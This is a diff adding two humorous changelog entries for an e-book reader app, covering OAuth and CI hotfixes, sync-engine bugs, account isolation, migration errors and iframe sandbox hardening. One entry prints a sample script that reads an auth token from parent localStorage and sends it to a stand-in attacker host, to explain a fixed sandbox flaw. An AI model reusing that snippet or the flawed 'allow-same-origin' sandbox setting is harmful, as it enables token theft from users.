@@ -23,6 +23,8 @@
 - [Entry #14 (2026-10-02): Phase 10 Audio Narration (TTS) & Accessibility](#entry-14-2026-10-02-phase-10-audio-narration-tts--accessibility)
 - [Entry #15 (2026-10-05): Sync Engine Hardening, Comprehensive LWW Conflict Resolution & Stale Client Invalidation](#entry-15-2026-10-05-sync-engine-hardening-comprehensive-lww-conflict-resolution--stale-client-invalidation)
 - [Entry #16 (2026-10-05): Decoupling Google Drive Authentication from Dev Mode & Dynamic OAuth Client Configuration](#entry-16-2026-10-05-decoupling-google-drive-authentication-from-dev-mode--dynamic-oauth-client-configuration)
+- [Entry #17 (2026-10-06): The Hall of Shame: Paranoid CI Secrets & Tryhard PKCE (Hotfixes #15 & #16)](#entry-17-2026-10-06-the-hall-of-shame-paranoid-ci-secrets--tryhard-pkce-hotfixes-15--16)
+- [Entry #18 (2026-10-06): The Post-Audit Reality Check: Zombie Books, Amnesiac Caches, and the Sandbox That Wasn't (PR #17)](#entry-18-2026-10-06-the-post-audit-reality-check-zombie-books-amnesiac-caches-and-the-sandbox-that-wasnt-pr-17)
 
 ---
 
@@ -570,5 +572,231 @@ During UI and user journey testing of the Google Drive integration, a critical U
 #### 3. Verification & Quality Gates
 - `pnpm -r exec tsc --noEmit`: **0 errors** across monorepo.
 - `pnpm test`: **51/51 tests passing** (100% green).
+
+---
+
+### Entry #17 (2026-10-06): The Hall of Shame: Paranoid CI Secrets & Tryhard PKCE (Hotfixes #15 & #16)
+
+#### 1. Hotfix #15: The Secret That Was Too Secret For Its Own Runner
+* **Expectation:** Created `EXPO_PUBLIC_GOOGLE_CLIENT_ID` in GitHub Repository Secrets. Felt like a cybersecurity mastermind. Expected production to just work.
+* **Production Reality:** *"Google Client ID chưa được cấu hình cho ứng dụng. Vui lòng liên hệ quản trị viên của deployment này."* The irony? The person staring at the error *was* the administrator.
+* **The Absurdity:**
+  * GitHub Actions operates on galactic-tier paranoia. It locks secrets in a titanium vault, but when executing a `run:` step, it refuses to hand over the key unless explicitly bribed with an `env:` block.
+  * Metro Bundler didn't even bother raising an eyebrow. It looked at the empty shell environment, shrugged, and hardcoded `undefined` straight into the JavaScript bundle.
+  * Inspecting production's minified bundle felt like a bad joke:
+    ```javascript
+    function h() { const e = void 0; return e?.trim() || null; }
+    ```
+    Peak engineering: deploying a function painstakingly compiled to always return `null`.
+* **The Fix:** Donated two lines of `env:` in `.github/workflows/deploy.yml` so GitHub Actions would finally stop hoarding its own secrets.
+
+#### 2. Hotfix #16: When expo-auth-session Tried Too Hard and Got Slapped with Error 400
+* **Expectation:** PR #15 landed, Client ID finally materialized on production, Google OAuth popup opened. Cue celebration.
+* **Production Reality:** Google immediately slammed the door shut with a pitch-black screen:
+  > **Error 400: invalid_request**  
+  > *Parameter not allowed for this message type: code_challenge_method*
+* **The Absurdity:**
+  * `expo-auth-session` suffers from chronic overachiever syndrome.
+  * Folium uses an OpenID Connect Implicit flow (`response_type=token id_token`) so client SPAs can receive tokens directly without dragging an entire backend proxy into the mix.
+  * But `expo-auth-session` decided: *"It's 2026, everybody MUST use PKCE!"* Without anyone asking, it defaulted `usePKCE: true` and proudly slapped `code_challenge_method=S256` onto our URL query.
+  * Google's OAuth server looked at the request and went: *"Who asked for PKCE on an implicit token request? RFC 7636 says no. Get out."*
+* **The Fix:** Literally one line:
+  ```typescript
+  usePKCE: false,
+  ```
+  Code written exclusively to tell the library: *"Calm down, nobody asked for your unsolicited security enthusiasm."*
+
+#### Lessons Learned
+1. Storing secrets in GitHub UI without an `env:` block in YAML is like buying a bank vault and throwing the key into the ocean.
+2. Libraries that default to "extra helpful security" are actively trying to get you Error 400'd.
+3. When debugging production builds, trust no one except the minified `.js`: `void 0` never lies.
+
+---
+
+### Entry #18 (2026-10-06): The Post-Audit Reality Check: Zombie Books, Amnesiac Caches, and the Sandbox That Wasn't (PR #17)
+
+#### Summary & Post-Audit Revelations
+Fresh off the high of "fixing" OAuth with one line of code in PR #16, a comprehensive audit of `main` revealed that while we were busy arguing about OAuth flows, the rest of the application was happily breaking fundamental laws of distributed systems and browser security.
+
+#### 1. The Sandbox That Left the Front Door Wide Open
+* **The Grand Illusion:** We had spent weeks bragging about "Phase 8.8 Storage Armor," writing 500 lines of regex firewalls, zero-exfiltration CSP rules, zip-bomb decompression ratio checkers, and SVG script quarantines. We felt like digital NSA architects.
+* **The Reality Check:** The iframe sandbox in `EpubReader.tsx` and `PdfReader.tsx` was configured as:
+  ```tsx
+  sandbox="allow-scripts allow-same-origin"
+  ```
+* **The Punchline:** In browser security 101, `allow-scripts allow-same-origin` on an iframe inside a static SPA literally means: *"This iframe shares full document origin with the parent window."* Any downloaded public domain EPUB or malicious PDF containing a tiny `<script>` tag could casually execute:
+  ```javascript
+  const token = parent.localStorage.getItem('FOLIUM_AUTH_USER');
+  fetch('https://evil-hacker.com/steal?token=' + token);
+  ```
+  All that fortress-grade CSP armor, and the front door was held open with a brick.
+* **The Fix:** Stripped `allow-same-origin` down to pure `sandbox="allow-scripts"`. The iframe is now exiled to an opaque `null` origin where parent `localStorage` is mathematically unreachable, and bridge communication is restricted to strictly typed `postMessage`.
+
+#### 2. The 410 "Reset Cursor and Pray" Protocol Disaster
+* **The Grand Illusion:** We designed an elaborate 30-day tombstone garbage collection watermark on Cloudflare Worker. If a client disappeared for 30 days and came back with a stale cursor, the Worker returned `HTTP 410 Gone (CURSOR_EXPIRED)`. Very fancy. Very distributed systems.
+* **The Punchline:** Here is how the client handled `410`:
+  ```typescript
+  setLastSyncedSeq(0);
+  return pullRemoteChanges();
+  ```
+  That was it. The client literally set its cursor to `0`, pulled all remaining server rows, and didn't touch anything else.
+  * Server deleted Book A at `seq=10`.
+  * GC ran at `seq=50`, purging Book A's tombstone.
+  * Client connected with `cursor=5`.
+  * Worker sent `410`.
+  * Client pulled server records from `0`. Since Book A's tombstone was gone, the server never told the client Book A was deleted.
+  * Result: Book A remained on the client forever. An automated garbage collection mechanism that actively prevented garbage from being collected.
+* **The Fix:** Implemented active snapshot reconciliation on `410`: when an expired cursor triggers a full resync, local database state is diffed against the server snapshot for all cloud-synced records (`sync_seq > 0`), safely pruning records that were GC'd on the cloud while preserving unpushed mutations in the local outbox.
+
+#### 3. Zombie Books: Who Needs Timestamps Anyway?
+* **The Grand Illusion:** We spent days refining Last-Write-Wins (LWW) conflict resolution with millisecond timestamps across bookmarks, highlights, and reading progress.
+* **The Punchline:** Someone forgot the most important table: `books`.
+  * In the Worker's `POST /api/sync/push`:
+    ```sql
+    ON CONFLICT(id) DO UPDATE SET title = excluded.title, is_deleted = excluded.is_deleted...
+    ```
+    There was no `WHERE excluded.updated_at >= books.updated_at`. Zero timestamp validation.
+  * Worse, `deleteBook()` queued mutations with no timestamps, leaving the server to improvise with `Date.now()`, and `pullRemoteChanges()` updated `is_deleted = 1` without advancing `updated_at`. If a book was created at $T=1000$, deleted at $T=2000$, its local `updated_at` remained $1000$. A stale offline edit from $T=1500$ would check $1500 \ge 1000$, pass with flying colors, and resurrect the book!
+* **The Fix:** Added `client_updated_at` to Cloudflare D1 schema (`0004_book_lww.sql`), attached explicit client deletion timestamps in `deleteBook()`, advanced `updated_at` on tombstone application (`SET is_deleted = 1, deleted_at = ?, updated_at = ? WHERE ? >= updated_at`), and added strict LWW guards on both D1 and SQLite.
+
+#### 4. Multi-User Amnesia: "All Your Folders Belong to User A"
+* **The Punchline:** In `googleDriveService.ts`:
+  ```typescript
+  let cachedFolderId: string | null = null;
+  ```
+  User A logs in -> Folium folder created -> `cachedFolderId = "folder_A"`.
+  User A logs out. User B logs in on the same browser.
+  `getOrCreateFoliumFolder()` checks `cachedFolderId`: *"Oh look, I already have a folder ID!"* and attempts to sync User B's library into User A's Google Drive. Google APIs promptly returned 404/403, baffling everyone involved.
+  Meanwhile, local SQLite had zero user isolation: User B's fresh login would inherit User A's books and pending outbox mutations!
+#### 5. The Cursor Fast-Forward Delusion: "We Don't Need to Pull, We're Contiguous!"
+* **The Grand Illusion:** When pushing mutations to D1, the client tracked its local sequence cursor:
+  ```typescript
+  if (committedSeq === currentCursor + 1) {
+    await setLastSyncedSeq(committedSeq);
+  } else if (committedSeq > currentCursor + 1) {
+    await pullRemoteChanges();
+  }
+  ```
+  The logic seemed so clever: *"If the sequence is contiguous ($N \to N+1$), no other device wrote anything in between, so we don't need to waste a network request pulling!"*
+* **The Punchline:** Distributed systems called, and they're laughing.
+  * Server had Book A deleted at $T=2000$ (`current_seq = 1`).
+  * Client A reconnected from offline and pushed a stale title edit for Book A at $T=1500$.
+  * Worker bumped `current_seq` to 2, executed the upsert with our shiny new LWW guard `WHERE excluded.client_updated_at >= books.client_updated_at`, and D1 promptly rejected the mutation (`meta.changes === 0`).
+  * Worker returned `committed_sync_seq = 2`.
+  * Client saw: `committedSeq (2) === currentCursor (1) + 1`!
+  * Client went: *"Hooray! Contiguous sequence! Cursor = 2!"* and **DID NOT PULL**.
+  * Result: Server had Book A marked deleted. Client had Book A marked active. Client cursor was now 2. Client would never receive the tombstone because it skipped right past sequence 2 without reading the server's canonical state!
+* **The Fix:** Completely ripped out the conditional fast-forward. After draining outbox mutations, the client **always** executes `await pullRemoteChanges()`. If the server rejected a stale write, the pull immediately retrieves the server's winning canonical tombstone and reconciles local SQLite before the cursor advances.
+* **Bonus Fix (Accurate Worker `accepted_count`):** The Worker was incrementing `acceptedCount++` while queuing SQL strings into an in-memory batch, before D1 even touched them. We replaced this vanity counter with actual inspection of `(batchResults[j]?.meta as any)?.changes > 0`. If D1 rejects a mutation due to LWW timestamp conflict, `accepted_count` is 0. Radical honesty at the edge.
+
+#### 6. The Legacy Migration Blindspot: When `sync_seq = 0` Means Everything and Nothing
+* **The Punchline:** In our first pass, we attempted to isolate accounts with:
+  ```sql
+  SELECT id FROM books WHERE sync_seq > 0 OR drive_file_id IS NOT NULL
+  ```
+  The idea was: `sync_seq > 0` or Drive file ID means "cloud data," and anything else is "local guest data."
+  * Except `sync_seq` was literally just introduced with `DEFAULT 0`.
+  * Any user who had books synced to D1 before PR17 now had `sync_seq = 0`. If they didn't have a Google Drive file ID, their books had `sync_seq = 0` and `drive_file_id = NULL`.
+  * When User A logged out and User B logged in, `detachAccountLocalState()` looked at User A's legacy synced books, went *"Looks like a guest book to me!"*, and left them right there in SQLite for User B to read. A complete account isolation breach masquerading as guest preservation.
+* **The Fix:**
+  1. Added `user_id TEXT` column to `books` in SQLite and shared data contracts.
+  2. Stamped `user_id` explicitly during book imports and pull upserts.
+  3. Scoped `getBooksWithProgress()` and `getAvailableShelves()` queries to `(user_id = ? OR user_id IS NULL)` (defense-in-depth at query time).
+  4. Updated `detachAccountLocalState(targetUserId)` and `reconcileSnapshotEntities()` to query by `user_id` and cloud markers, cleanly detaching legacy books on account switch while strictly isolating guests.
+  5. Refactored `signInWithGoogle()`: enforced `handleAccountLifecycleSwitch()` *before* calling `persistUser()`, ensuring any isolation failures abort login immediately rather than swallowing errors in an empty `catch {}` block.
+
+#### 7. The Broken Migration Chain: "Why Not Alter What Already Exists?"
+* **The Punchline:** In our rush to introduce `client_updated_at`, we did the cardinal database sin:
+  * We edited `0001_init.sql` to add `client_updated_at INTEGER NOT NULL DEFAULT 0` directly to `CREATE TABLE books`.
+  * Then we proudly created `0004_book_lww.sql`: `ALTER TABLE books ADD COLUMN client_updated_at...`.
+  * Any fresh database attempting to boot from scratch ran `0001` (column created) $\to$ `0002` $\to$ `0003` $\to$ `0004` (ALTER TABLE fails with `duplicate column name: client_updated_at`).
+  * A release candidate that literally could not deploy to a fresh D1 instance.
+* **The Fix:** Restored `0001_init.sql` to its immutable historical state. `0004_book_lww.sql` is now the single canonical migration that adds `client_updated_at`, ensuring sequential migrations succeed cleanly on both brand-new and pre-existing production databases. Verified by automated tests.
+
+#### 8. The "Zero-Knowledge" Fiction: We Swear We Don't Know the Book Title (Except We Just Sent It to Google)
+* **The Punchline:** Comments in `googleDriveService.ts` proudly proclaimed:
+  ```typescript
+  // Zero-Knowledge metadata protection:
+  // Use UUID filename `${book.id}.${book.file_type}` instead of plaintext book title
+  // to prevent cloud storage providers from fingerprinting user reading libraries.
+  ```
+  Meanwhile, thirty lines down in the exact same file:
+  ```typescript
+  appProperties: {
+    foliumTitle: book.title,
+    foliumShelf: book.shelf,
+  }
+  ```
+  *"We protected your privacy by hiding the filename, and then we emailed Google the book title and genre in JSON."*
+* **The Fix:** Killed the pretentious "Zero-Knowledge" claim. Clarified code and documentation to state what it actually is: opaque UUID file naming on Drive storage.
+
+#### 9. Edge Fortification: SSRF Resource Limits & Runtime Schema Gatekeeping
+* **The Punchline:** Our `/api/community/download` proxy checked URLs against an allowlist, but would gladly stream a 10 GB file or hang indefinitely if upstream decided to slowloris the Worker. And `/api/sync/push` took `c.req.json<SyncPushPayload>()` on blind faith without validating runtime types or string lengths.
+* **The Fix:**
+  * Enforced a strict 50 MB payload cap and a 15-second `AbortSignal.timeout(15000)` on upstream OPDS downloads.
+  * Built `validateSyncPushPayload()` to strictly validate arrays, string lengths (title $\le 500$, note $\le 10,000$), numeric bounds (progress percentage $0 \dots 100$), and format enums at the Worker edge before database execution.
+
+#### 10. Automated CI/CD Architecture: PR Quality Gate & Deterministic Deployment
+* **The Fix:**
+  * Created `.github/workflows/ci.yml` as a mandatory PR gate (running typechecks, 60/60 tests, migration verification, and Expo web build on every pull request).
+  * Structured `.github/workflows/deploy.yml` with deterministic release order:
+    1. Schema first: Apply D1 migrations (`d1:migrate:prod`).
+    2. API second: Deploy Cloudflare Worker (`wrangler deploy`).
+    3. Client last: Build & deploy Web SPA to GitHub Pages (`aki.is-a.dev`).
+
+#### 11. The Ownership vs. Cloud-Synced Trap: When 410 Reconciliation Eats Offline Books
+* **The Punchline:** In fixing account isolation, we stamped local guest books with `user_id = 'A'` when User A signed in.
+  * Then, in `reconcileSnapshotEntities()`:
+    ```sql
+    SELECT id FROM books WHERE is_deleted = 0 AND (sync_seq > 0 OR user_id = ? OR drive_file_id IS NOT NULL)
+    ```
+  * Notice the innocent `OR user_id = ?`.
+  * Because of that `OR`, any local-only book imported offline by User A (`sync_seq == 0, drive_file_id == null`) was immediately treated as a candidate for server tombstone garbage collection!
+  * When a 410 full resync triggered, the server returned its snapshot of cloud books. The server, of course, had never heard of User A's offline EPUB.
+  * Reconciliation saw: *"User A owns this book, but the server snapshot doesn't have it! It must have been deleted 35 days ago on the cloud!"* $\to$ `is_deleted = 1`.
+  * User logs in, experiences a resync, and watches their local offline books vanish into thin air.
+* **The Fix:** Hardened the fundamental invariant: **Account Ownership $\ne$ Cloud-Synced**.
+  * `user_id` defines local device boundary (preventing User B from seeing User A's files).
+  * `(sync_seq > 0 OR drive_file_id IS NOT NULL)` defines cloud tracking.
+  * `reconcileSnapshotEntities()` now strictly filters candidates by `(sync_seq > 0 OR drive_file_id IS NOT NULL) AND (user_id = ? OR user_id IS NULL)`. Offline account-owned books (`sync_seq == 0`) are completely exempt from cloud tombstone pruning. Verified by automated tests.
+
+#### 12. Cross-Account Annotation Quarantine: Why Bob's Bookmarks Vanished During Alice's Resync
+* **The Punchline:** In fixing book reconciliation, we patted ourselves on the back for properly scoping books by `user_id`. But someone forgot to look at `bookmarks`, `highlights`, and `notes`.
+  * In Folium's SQLite schema, annotation tables don't have a `user_id` column—they only reference `book_id`.
+  * So how were orphaned annotations pruned during HTTP 410 full resync?
+    ```sql
+    SELECT id FROM bookmarks WHERE is_deleted = 0 AND sync_seq > 0
+    ```
+    Global. Blind. Zero account boundary whatsoever.
+  * Imagine Alice and Bob share a tablet or test on the same browser:
+    * Alice has Book A with Bookmark A1 (`sync_seq = 5`).
+    * Bob has Book B with Bookmark B1 (`sync_seq = 7`).
+    * Alice encounters HTTP 410 and triggers a full cloud resync.
+    * The Cloudflare Worker returns Alice's cloud snapshot. Naturally, Alice's snapshot contains zero trace of Bob's entities.
+    * The reconciliation code dutifully queries `WHERE sync_seq > 0`, grabs Bob's Bookmark B1, notices it's absent from Alice's server snapshot, and concludes: *"Aha! This cloud bookmark isn't in the snapshot! It must have been purged from the cloud!"*
+    * `UPDATE bookmarks SET is_deleted = 1 WHERE id = 'bm-bob'`.
+    * Alice resyncs her reading list, and Bob's years of highlights and annotations are quietly massacred in the background. Peak multi-user safety.
+* **The Fix:**
+  * Joined annotations to parent `books` via `JOIN books b ON b.id = entity.book_id`.
+  * Enforced dual invariant filtering:
+    ```sql
+    WHERE entity.is_deleted = 0 AND entity.sync_seq > 0
+      AND (b.sync_seq > 0 OR b.drive_file_id IS NOT NULL)
+      AND (b.user_id = ? OR b.user_id IS NULL)
+    ```
+  * Alice's 410 resync is now quarantined strictly to annotations belonging to Alice's own cloud-tracked books (or unassigned guest books). Bob's annotations remain completely untouched.
+  * Added `SYNC RECONCILIATION 3` in `tests/security/sync_engine_lww.test.mjs`, verifying cross-account isolation across books, bookmarks, highlights, and notes under 410 resync.
+
+#### 13. Verification & Test Metrics
+* Typecheck across all monorepo packages: **0 errors** (`pnpm -r exec tsc --noEmit`).
+* Security & Distributed Test Suite: **62/62 passing** against real `sql.js` SQLite databases:
+  * Full migration chain (`0001` $\to$ `0004`) verified on fresh and legacy databases.
+  * Push-then-pull canonical reconciliation verifying winning tombstones over stale writes.
+  * Strict account isolation with legacy data attribution and default detachment on `signOut()`.
+  * Distinction between account ownership and cloud tracking (offline books survive 410 resync).
+  * Cross-account annotation isolation during 410 resync (Bob's annotations preserved).
+  * Runtime push payload schema validation and SSRF resource limits.
+* CI: Gated across PRs (`.github/workflows/ci.yml`) and production deployments (`.github/workflows/deploy.yml`).
+
 
 
